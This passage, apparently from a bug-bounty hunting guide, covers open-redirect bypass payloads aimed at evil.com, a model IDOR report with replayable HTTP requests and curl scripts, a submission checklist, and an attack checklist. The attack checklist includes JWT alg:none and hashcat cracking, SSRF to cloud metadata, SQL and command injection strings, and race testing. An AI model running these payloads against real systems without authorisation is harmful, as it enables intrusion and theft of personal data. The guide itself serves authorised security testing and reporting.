?next=//evil.com                    # protocol-relative
?next=https://target.com@evil.com   # auth confusion
?next=https://evil.com%2F@target.com # encoded slash
?next=https://evil%2ecom            # encoded dot
?next=\evil.com                     # backslash (IE/Edge)
?next=https://target.com.evil.com   # subdomain confusion
?next=javascript:alert(1)           # JS protocol
```

### 13.3 Proof

```
GET /login?next=https://evil.com HTTP/2
Host: target.com

HTTP/2 302 Found
Location: https://evil.com

Impact: An attacker can send a victim a login link that, after authentication, 
redirects to a phishing page under attacker control. Combined with a phishing 
campaign this becomes credential harvesting.
```

---

## 14. How to Write a Proof

A proof is a **repeatable series of HTTP requests** that anyone — including a triager who has never used the app — can follow to reproduce the impact.

### 14.1 The structure — always the same

```
Title: IDOR in Order History Endpoint Exposes PII of Arbitrary Users

Severity: High

Summary:
An authenticated attacker can retrieve any user's order history — including
email address, home address, and card last 4 digits — by changing the order ID
in the GET /api/v1/orders/{id} endpoint.

Prerequisites:
- Two test accounts: Attacker (attacker@test.com) and Victim (victim@test.com)
- Attacker account must be authenticated
- Victim must have at least one order

Steps to Reproduce:

1. Log in as Victim (victim@test.com). Create order #10042.
   The order contains: email=victim@test.com, address="10 Victim Lane", card_last4=4242

2. Log out. Log in as Attacker (attacker@test.com).

3. Send the following request (note: attacker's session cookie):

   GET /api/v1/orders/10042 HTTP/2
   Host: api.target.com
   Cookie: session=ATTACKER_SESSION_xyz789
   Accept: application/json

4. Observe response:

   HTTP/2 200 OK
   Content-Type: application/json
   {
     "id": 10042,
     "user_id": 5551,
     "email": "victim@test.com",
     "address": "10 Victim Lane",
     "card_last4": "4242",
     "total": "$499.00",
     "items": [...]
   }

Impact:
An attacker can enumerate all order IDs (sequential integers) and exfiltrate
the PII of every customer: email, home address, payment method metadata.
Scale: full customer database exposed.

Evidence:
[Burp screenshot showing both sessions side by side]
[Screen recording of the full reproduction flow]
```

### 14.2 What makes proof valid

| Element | Why it matters |
|---|---|
| Full HTTP request with headers | Triager must be able to copy-paste and replay |
| Session cookie / auth token visible | Proves attacker credentials were used, not victim's |
| Response showing victim-specific data | Proves actual impact, not just a different response code |
| Before/after state for logic bugs | Proves the outcome (balance change, role change) |
| Two distinct accounts for IDOR | Proves it is not just reading your own data |

### 14.3 curl commands to generate proof automatically

```bash
# Generate a clean proof transcript
TARGET="api.target.com"
VICTIM_TOKEN="eyJvictim..."
ATTACKER_TOKEN="eyJattacker..."
ORDER_ID="10042"

echo "=== STEP 1: Victim's own request ==="
curl -sv "https://$TARGET/api/v1/orders/$ORDER_ID" \
  -H "Authorization: Bearer $VICTIM_TOKEN" 2>&1 | grep -E "^[<>]|^\{|^\[" | head -30

echo ""
echo "=== STEP 2: Attacker reads Victim's order ==="
curl -sv "https://$TARGET/api/v1/orders/$ORDER_ID" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" 2>&1 | grep -E "^[<>]|^\{|^\[" | head -30
```

Save that output to a file and paste it in your report.

---

## 15. 7-Question Gate

Run every finding through this before writing a report. One NO kills the submission.

| # | Question | If NO |
|---|---|---|
| 1 | Can an attacker do this RIGHT NOW against a real user? | Hypothesis — move on |
| 2 | Is the attacker distinct from the victim (no self-only exploit)? | Self-issue — not a vuln |
| 3 | Is the target asset in scope per the program policy? | Out of scope — do not submit |
| 4 | Does this require no physical access or social engineering? | Too many prerequisites |
| 5 | Is the real-world impact measurable (PII, funds, auth bypass)? | Informational at best |
| 6 | Does the bug still exist right now — not just in cached JS? | May be patched |
| 7 | Can you reproduce it with a fresh browser/session right now? | Not reproducible — do not submit |

All 7 YES → write the report.

---

## 16. Quick Reference Checklist

```
RECON
[ ] curl -sI https://target.com — read headers for stack fingerprint
[ ] curl -s https://target.com/robots.txt
[ ] curl -s https://target.com/.well-known/security.txt
[ ] for each: api-docs swagger.json openapi.json graphql .git/HEAD .env
[ ] grep JS bundles for /api/ endpoints and secrets
[ ] subfinder + httpx for subdomains

IDOR
[ ] Log every numeric ID seen in Burp during normal use
[ ] For each: try id+1, id-1, id=1, id=2
[ ] For each: use Account B to access Account A's resource
[ ] Check POST body and query params for user_id fields

AUTH
[ ] Remove Authorization header from every authenticated request
[ ] Try USER_TOKEN on every admin endpoint found
[ ] Decode JWT: check alg, role fields, expiry
[ ] Try alg:none JWT
[ ] Try known weak secrets: hashcat jwt.txt rockyou.txt

SSRF
[ ] Find all url= / webhook= / callback= params
[ ] Send interactsh URL to every one — check for callbacks
[ ] If callback confirmed: try 169.254.169.254 metadata

INJECTION
[ ] Append ' to every string parameter — read error
[ ] time curl with ; SLEEP(5)-- payloads
[ ] Command injection on any network/file feature: ; id, | id, $(id)

LOGIC
[ ] Try quantity=-1 on any quantity field
[ ] Apply same coupon twice
[ ] Send price fields in client requests
[ ] Skip checkout steps — POST to final step directly

INFO DISCLOSURE
[ ] Send wrong types to every parameter — read errors
[ ] Check for .git, .env, backup.zip, actuator, actuator/env
[ ] Check for .js.map source maps

RACE
[ ] Any "use once" action: fire 20 parallel curl requests
[ ] Check account state before and after

API
[ ] Try all HTTP methods on every endpoint
[ ] Add role/admin/balance/verified to every create/update request
[ ] Send same param twice: ?id=A&id=B
[ ] Try api/v1, api/v0 on any protected v2 endpoint

GRAPHQL
[ ] POST {"query":"{ __schema { types { name } } }"} to /graphql
[ ] Add hidden fields to user queries: password, role, internalId
[ ] Try admin mutations as regular user
[ ] Send array of 100 queries in one request
```

---

*Real bugs pay. Theoretical bugs do not. Prove everything with curl.*
